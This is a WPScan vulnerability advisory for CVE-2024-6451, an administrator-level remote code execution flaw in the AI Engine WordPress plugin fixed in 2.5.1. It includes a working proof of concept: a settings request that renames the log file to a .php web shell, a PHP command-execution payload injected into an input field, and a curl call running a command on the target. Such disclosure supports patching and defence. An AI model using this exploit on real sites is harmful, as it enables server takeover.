

[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# AI Engine < 2.5.1 - Admin+ RCE

### Description

AI Engine < 2.4.3 is susceptible to remote-code-execution (RCE) via Log Poisoning. The plugin fails to validate the file extension of "logs\_path", allowing Administrators to change log filetypes from .log to .php.

Error messages can then be manipulated to contain arbitrary PHP with the intent to have this echoed in the log file and ultimately executed as legitimate code by the web server, leading to the potential for remote-code-execution.

### Proof of Concept

1. Navigate to AI Engine > Settings > Advanced > Enable Dev Tools (as Admin)
----------------------------------------------------------------------
2. Navigate to AI Engine > Dev Tools > Enable Server Debug
----------------------------------------------------------------------
3. Save settings and change the extension (and filename, optionally) of "logs\_path" from .log to .php via the below request:
POST /wp-json/mwai/v1/settings/update HTTP/1.1
Host: 192.168.178.143
Content-Length: 17702
Pragma: no-cache
Cache-Control: no-cache
X-WP-Nonce: [NONCE]
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: [Admin+ Cookie]
Connection: keep-alive
{
"options": {
"embeddings\_default\_env": "lohkmfon",
"ai\_default\_env": "zl9pvc1h",
"module\_suggestions": true,
"module\_chatbots": true,
"module\_forms": false,
"module\_blocks": false,
"module\_playground": true,
-- SNIP --
},
"public\_api": true,
"debug\_mode": false,
"server\_debug\_mode": true,
"logs\_path": "/opt/bitnami/wordpress/wp-content/uploads/webshell.php"
}
}
----------------------------------------------------------------------
4. Insert payload <?php if(isset($\_GET['cmd'])){system($\_GET['cmd']);}?> into "Organization ID" input field (located at Settings > Environments for AI)
----------------------------------------------------------------------
5. Trigger the error so that the log file is poisoned with the PHP payload. This can be done unauthenticated by simply prompting the chatbot, or as admin by clicking Transcription > Transcribe Image.
This should inject the log file with "2024-06-21 14:43:04: ❌ (OpenAI) No such organization: <?php if(isset($\_GET['cmd'])){system($\_GET['cmd']);}?>."
----------------------------------------------------------------------
6. Execute commands on the remote server via the poisoned log file:
--> Request: curl http://192.168.178.143/wp-content/uploads/webshell.php?cmd=id
--> Response: 2024-06-18 10:26:24: ❌ (OpenAI) No such organization: uid=1(daemon) gid=1(daemon) groups=1(daemon)

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

ai-engine](https://a8cteam5105.wordpress.com/plugin/ai-engine/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 2.5.1

### References

CVE
[CVE-2024-6451](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6451)

### Classification

Type
RCE

OWASP top 10
[A1: Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection)

CWE
[CWE-94](https://cwe.mitre.org/data/definitions/94.html)

CVSS
[6.6 (medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:L)

### Miscellaneous

Original Researcher
Karolis Narvilas

Submitter
Karolis Narvilas

Submitter website
<https://prisminfosec.com>

Verified
Yes

WPVDB ID
[fc06d413-a227-470c-a5b7-cdab57aeab34](https://a8cteam5105.wordpress.com/vulnerability/fc06d413-a227-470c-a5b7-cdab57aeab34/)

### Timeline

Publicly Published
2024-07-29 (about 5 months ago)

Added
2024-07-29 (about 5 months ago)

Last Updated
2024-07-29 (about 5 months ago)

### Other

Published
Title

Published
2024-10-14
Title
[Unlimited Elements For Elementor (Free Widgets, Addons, Templates) < 1.5.122 - Authenticated (Editor+) Remote Code Execution](https://a8cteam5105.wordpress.com/vulnerability/880e8757-eb4f-420f-9247-f0526914c99a/)

Published
2015-02-26
Title
[Import any XML or CSV File to WordPress <= 3.2.3 - RCE](https://a8cteam5105.wordpress.com/vulnerability/87c4b6bd-d417-452b-981b-fd7d715d4850/)

Published
2016-08-02
Title
[wSecure Lite <= 2.3 - Remote Code Execution (RCE)](https://a8cteam5105.wordpress.com/vulnerability/b34fec46-02f2-4760-80a9-600ff35ebe5c/)

Published
2024-12-11
Title
[SeedProd Pro <= 6.18.10 - Authenticated (Editor+) Remote Code Execution](https://a8cteam5105.wordpress.com/vulnerability/2abc3014-ea66-4b92-9c5d-4784d5f84dd2/)

Published
2024-05-23
Title
[WP Photo Album Plus < 8.7.00.004 - Unauthenticated Arbitrary Shortcode Execution](https://a8cteam5105.wordpress.com/vulnerability/9943ac19-95e3-4273-a245-d3ecb8aa63bc/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + [Edit Site](https://a8cteam5105.wordpress.com/wp-admin/site-editor.php?postType=wp_template&postId=a8c/wpscan//index)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)
